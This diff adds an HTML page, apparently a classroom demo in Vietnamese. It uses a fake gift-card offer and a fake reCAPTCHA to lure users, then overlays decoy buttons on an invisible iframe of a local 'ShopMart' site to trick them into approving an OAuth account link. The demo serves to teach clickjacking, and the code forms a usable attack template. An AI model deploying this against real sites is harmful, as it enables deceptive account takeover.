@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GiftVerify - Xac Minh Nhan The Qua Tang</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Roboto,Arial,sans-serif; }
+  body { background:#f0f3f8; color:#222; }
+
+  header.site {
+    height:70px; background:#fff; border-bottom:1px solid #e3e7ee;
+    display:flex; align-items:center; justify-content:space-between; padding:0 30px;
+  }
+  header.site .logo { font-size:21px; font-weight:800; color:#e5316a; }
+
+  .wrap {
+    max-width: 620px; margin: 50px auto; background:#fff; border-radius:18px;
+    box-shadow:0 10px 30px rgba(0,0,0,.07); padding: 40px 50px; text-align:center;
+  }
+  .wrap .gift-icon { font-size:46px; }
+  .wrap h1 { font-size:21px; margin: 10px 0 6px; }
+  .wrap p { color:#777; font-size:13.5px; margin-bottom: 26px; }
+  .code-box {
+    background:#fff3f7; border: 1.5px dashed #e5316a; border-radius:10px;
+    padding: 14px; font-weight:800; font-size:18px; color:#e5316a; letter-spacing:3px; margin-bottom: 26px;
+  }
+
+  /* ----- KHUNG FAKE RECAPTCHA ----- */
+  .captcha-box {
+    border:1px solid #d3d3d3; border-radius:6px; width: 320px; margin: 0 auto;
+    background:#f9f9f9; display:flex; align-items:center; padding: 16px 18px; gap:14px;
+    transition: all .35s ease;
+  }
+  .captcha-box.expanded { width: 300px; flex-direction:column; align-items: flex-start; gap:10px; padding: 18px; }
+  .captcha-check {
+    width:26px; height:26px; border:2px solid #c3c3c3; border-radius:4px; cursor:pointer;
+    display:flex; align-items:center; justify-content:center; background:#fff; flex-shrink:0;
+  }
+  .captcha-check.checked { background:#1fae5e; border-color:#1fae5e; color:#fff; font-weight:800; }
+  .captcha-text { font-size:14.5px; color:#333; text-align:left; }
+  .captcha-logo { margin-left:auto; text-align:center; font-size:9px; color:#999; }
+  .captcha-logo .g { font-size:22px; font-weight:800; }
+  .captcha-logo .g span:nth-child(1){color:#4285F4}
+  .captcha-logo .g span:nth-child(2){color:#EA4335}
+  .captcha-logo .g span:nth-child(3){color:#FBBC05}
+  .captcha-logo .g span:nth-child(4){color:#4285F4}
+  .captcha-logo .g span:nth-child(5){color:#34A853}
+  .captcha-logo .g span:nth-child(6){color:#EA4335}
+
+  .step2-note { font-size: 12px; color:#999; margin-top:14px; }
+
+  /* ----- IFRAME NAN NHAN ----- */
+  #victimFrame {
+    position: fixed; top:0; left:0; width:100vw; height:100vh; border:none;
+    z-index: 30; opacity: 0; pointer-events: none;
+  }
+
+  /* ----- NUT GIA BUOC 1 & 2 (toa do tuyet doi, khop ShopMart) ----- */
+  #decoyStep1 {
+    position: fixed; top:250px; left:660px; width:260px; height:50px;
+    z-index: 41; background: transparent; border: none; cursor:pointer;
+  }
+  #decoyStep2 {
+    position: fixed; top:310px; left:680px; width:260px; height:50px;
+    background: linear-gradient(90deg,#e5316a,#b81e50); color:#fff; border:none;
+    border-radius:10px; font-weight:700; font-size:13.5px; cursor:pointer; z-index: 42;
+    display:none; box-shadow:0 6px 16px rgba(229,49,106,.4);
+  }
+
+  #demoToggle {
+    position: fixed; bottom: 16px; left: 16px; z-index: 99;
+    background:#1b2430; color:#fff; border:1px solid #39495f; border-radius: 10px;
+    padding: 10px 14px; font-size: 12px; cursor:pointer; font-weight:700;
+  }
+  #demoLabel { position: fixed; bottom: 54px; left:16px; z-index:99; background:#000a; color:#fff; padding:4px 10px; border-radius:6px; font-size:11px; }
+</style>
+</head>
+<body>
+
+<header class="site">
+  <div class="logo">🎁 GiftVerify</div>
+  <div style="font-size:12px;color:#999;">Cong xac thuc nhan qua trung gian</div>
+</header>
+
+<div class="wrap">
+  <div class="gift-icon">🎁</div>
+  <h1>Ban vua nhan duoc 1 The Qua Tang tri gia 500.000đ!</h1>
+  <p>De bao ve he thong khoi spam, vui long xac minh ban khong phai la robot truoc khi nhan thuong.</p>
+  <div class="code-box">GIFT-8X42-QUA-TANG</div>
+
+  <div class="captcha-box" id="captchaBox">
+    <div class="captcha-check" id="checkMark" onclick="verifyStep1()"></div>
+    <div class="captcha-text">Toi khong phai la robot</div>
+    <div class="captcha-logo"><div class="g"><span>r</span><span>e</span><span>C</span><span>A</span><span>P</span><span>T</span></div>Privacy - Terms</div>
+  </div>
+  <div class="step2-note" id="step2Note" style="display:none;">Dang xac minh thiet bi cua ban... vui long bam nut xac minh ben duoi de hoan tat (nut mau hong co the nam o vi tri khac tren man hinh demo).</div>
+</div>
+
+<!-- IFRAME NAN NHAN -->
+<iframe id="victimFrame" src="http://localhost:5000"></iframe>
+
+<!-- NUT GIA BUOC 1: nam de len nut "Lien ket voi Google" that cua ShopMart -->
+<button id="decoyStep1" onclick="verifyStep1()"></button>
+<!-- NUT GIA BUOC 2: hien ra sau khi tick captcha, nam de len nut "Xac nhan cap quyen" -->
+<button id="decoyStep2" onclick="verifyStep2()">🔒 Xac minh ngay</button>
+
+<div id="demoLabel">Opacity iframe: <span id="opVal">0</span></div>
+<button id="demoToggle" onclick="toggleOpacity()">🎚 Chuyen do mo (Giang vien / Tan cong that)</button>
+
+<script>
+  var frame = document.getElementById('victimFrame');
+  var opVal = document.getElementById('opVal');
+  var state = 0;
+
+  function toggleOpacity() {
+    state = state === 0 ? 1 : 0;
+    frame.style.opacity = state === 1 ? '0.35' : '0';
+    opVal.innerText = state === 1 ? '0.35 (che do giai thich)' : '0 (tan cong that - vo hinh)';
+  }
+
+  function verifyStep1() {
+    document.getElementById('checkMark').classList.add('checked');
+    document.getElementById('checkMark').innerText = '✓';
+    document.getElementById('captchaBox').classList.add('expanded');
+    document.getElementById('step2Note').style.display = 'block';
+    document.getElementById('decoyStep2').style.display = 'block';
+  }
+
+  function verifyStep2() {
+    alert('🎯 [DEMO] Buoc 2 vua "roi xuyen qua" lop giao dien GiftVerify va thuc su rơi trung vao nut "Xac nhan cap quyen dang nhap" vo hinh cua ShopMart. Tai khoan hacker@gmail.com da duoc lien ket OAuth!');
+  }
+</script>
+</body>
+</html>
